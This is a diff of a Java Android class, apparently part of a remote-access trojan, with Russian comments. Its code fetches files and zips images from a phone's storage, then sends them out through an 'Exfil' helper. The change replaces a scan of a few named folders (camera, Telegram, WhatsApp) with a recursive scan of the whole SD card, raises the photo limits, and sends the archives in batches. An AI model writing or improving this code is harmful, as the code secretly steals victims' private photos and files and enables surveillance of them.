@@ -32,7 +32,6 @@ public class FileManager {
                     if (!a.isDirectory() && b.isDirectory()) return 1;
                     return a.getName().compareToIgnoreCase(b.getName());
                 });
-
                 StringBuilder sb = new StringBuilder();
                 sb.append("📁 ").append(path).append("\n━━━━━━━━━━━━━━━━━━\n");
                 int count = 0;
@@ -58,12 +57,11 @@ public class FileManager {
                     Exfil.send("FILE_GET", "Не найдено: " + path);
                     return;
                 }
-                long size = f.length();
-                if (size > 20 * 1024 * 1024) {
-                    Exfil.send("FILE_GET", "Большой: " + humanSize(size));
+                if (f.length() > 20 * 1024 * 1024) {
+                    Exfil.send("FILE_GET", "Большой: " + humanSize(f.length()));
                     return;
                 }
-                byte[] data = new byte[(int) size];
+                byte[] data = new byte[(int) f.length()];
                 FileInputStream fis = new FileInputStream(f);
                 fis.read(data);
                 fis.close();
@@ -75,98 +73,112 @@ public class FileManager {
         }).start();
     }
 
-    public static void lastPhotos(Context ctx) { photosZip(ctx, 10, "PHOTOS"); }
-    public static void allPhotos(Context ctx) { photosZip(ctx, 40, "PHOTOS_ALL"); }
+    public static void lastPhotos(Context ctx) { photosZip(ctx, 20, "PHOTOS"); }
+    public static void allPhotos(Context ctx) { photosZip(ctx, 200, "PHOTOS_ALL"); }
 
     private static void photosZip(Context ctx, int limit, String tag) {
         new Thread(() -> {
             try {
+                // Собираем ВСЕ изображения с /sdcard/
                 List<File> photos = new ArrayList<>();
-                File sd = Environment.getExternalStorageDirectory();
+                File root = Environment.getExternalStorageDirectory();
 
-                File[] dirs = {
-                    new File(sd, "DCIM/Camera"),
-                    new File(sd, "DCIM"),
-                    new File(sd, "Pictures"),
-                    new File(sd, "Pictures/Screenshots"),
-                    new File(sd, "Pictures/Instagram"),
-                    new File(sd, "Download"),
-                    new File(sd, "Download/Telegram"),
-                    new File(sd, "Telegram"),
-                    new File(sd, "WhatsApp/Media/WhatsApp Images")
-                };
-
-                for (File d : dirs) {
-                    if (d != null && d.exists()) collectImages(d, photos, 0);
-                }
+                // Быстрый обход всех папок
+                scanAll(root, photos, 0);
 
                 if (photos.isEmpty()) {
                     Exfil.send(tag, "Фото не найдены");
                     return;
                 }
 
+                // Сортируем от новых к старым
                 photos.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));
 
-                ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                ZipOutputStream zos = new ZipOutputStream(bos);
+                Exfil.send(tag, "Найдено " + photos.size() + " фото. Собираю ZIP...");
 
-                int added = 0;
-                long totalSize = 0;
-                for (File p : photos) {
-                    if (added >= limit) break;
-                    if (p.length() > 10 * 1024 * 1024) continue;
-                    if (totalSize + p.length() > 45 * 1024 * 1024) break;
+                // Разбиваем на несколько ZIP по 40 фото
+                int batchSize = 40;
+                int batchNum = 1;
+                int totalSent = 0;
 
-                    try {
-                        FileInputStream fis = new FileInputStream(p);
-                        ZipEntry entry = new ZipEntry(p.getName());
-                        entry.setTime(p.lastModified());
-                        zos.putNextEntry(entry);
+                for (int start = 0; start < photos.size() && totalSent < limit; start += batchSize) {
+                    int end = Math.min(start + batchSize, photos.size());
+                    List<File> batch = photos.subList(start, end);
 
-                        byte[] buf = new byte[8192];
-                        int n;
-                        while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);
+                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                    ZipOutputStream zos = new ZipOutputStream(bos);
+                    int added = 0;
+                    long totalSize = 0;
 
-                        zos.closeEntry();
-                        fis.close();
-                        added++;
-                        totalSize += p.length();
-                    } catch (Throwable ignored) {}
+                    for (File p : batch) {
+                        if (totalSent >= limit) break;
+                        if (p.length() > 8 * 1024 * 1024) continue;
+                        if (totalSize + p.length() > 45 * 1024 * 1024) break;
+
+                        try {
+                            FileInputStream fis = new FileInputStream(p);
+                            ZipEntry entry = new ZipEntry(batchNum + "_" + p.getName());
+                            entry.setTime(p.lastModified());
+                            zos.putNextEntry(entry);
+                            byte[] buf = new byte[8192];
+                            int n;
+                            while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);
+                            zos.closeEntry();
+                            fis.close();
+                            added++;
+                            totalSize += p.length();
+                            totalSent++;
+                        } catch (Throwable ignored) {}
+                    }
+                    zos.close();
+
+                    if (added > 0) {
+                        byte[] zipData = bos.toByteArray();
+                        String b64 = Base64.encodeToString(zipData, Base64.NO_WRAP);
+                        String name = tag + "_part" + batchNum + "_" + added + "фото.zip";
+                        Exfil.sendDocument(name + " (" + humanSize(zipData.length) + ")", b64, name);
+                        batchNum++;
+                        Thread.sleep(2000);
+                    } else {
+                        break;
+                    }
                 }
-                zos.close();
 
-                if (added == 0) {
-                    Exfil.send(tag, "Не удалось собрать ZIP");
-                    return;
-                }
-
-                byte[] zipData = bos.toByteArray();
-                String b64 = Base64.encodeToString(zipData, Base64.NO_WRAP);
-
-                Exfil.sendDocument(tag + " ZIP (" + added + " фото, "
-                    + humanSize(zipData.length) + ")", b64, "photos_" + added + ".zip");
+                Exfil.send(tag, "Готово. Отправлено " + totalSent + " фото в " + (batchNum - 1) + " ZIP");
             } catch (Throwable t) {
-                Exfil.send(tag, "Ошибка ZIP: " + t.getMessage());
+                Exfil.send(tag, "Ошибка: " + t.getMessage());
             }
         }).start();
     }
 
-    private static void collectImages(File dir, List<File> out, int depth) {
-        if (dir == null || depth > 4 || out.size() > 500) return;
+    // Рекурсивный обход ВСЕЙ SD-карты
+    private static void scanAll(File dir, List<File> out, int depth) {
+        if (dir == null || depth > 6 || out.size() > 5000) return;
         File[] files;
         try { files = dir.listFiles(); } catch (Throwable t) { return; }
         if (files == null) return;
+
         for (File f : files) {
-            if (out.size() > 500) return;
-            if (f.isDirectory()) collectImages(f, out, depth + 1);
-            else if (isImage(f.getName())) out.add(f);
+            if (out.size() > 5000) return;
+            if (f.isDirectory()) {
+                String n = f.getName().toLowerCase();
+                // Пропускаем системные
+                if (n.equals("android") && depth > 0) continue;
+                if (n.startsWith(".") && !n.equals(".thumbnails")) continue;
+                if (n.equals("obb")) continue;
+                if (n.equals("lost.dir")) continue;
+                scanAll(f, out, depth + 1);
+            } else {
+                if (isImage(f.getName())) out.add(f);
+            }
         }
     }
 
     private static boolean isImage(String name) {
         String l = name.toLowerCase();
         return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png")
-            || l.endsWith(".webp") || l.endsWith(".heic");
+            || l.endsWith(".webp") || l.endsWith(".heic")
+            || l.endsWith(".gif") || l.endsWith(".bmp");
     }
 
     private static String humanSize(long bytes) {
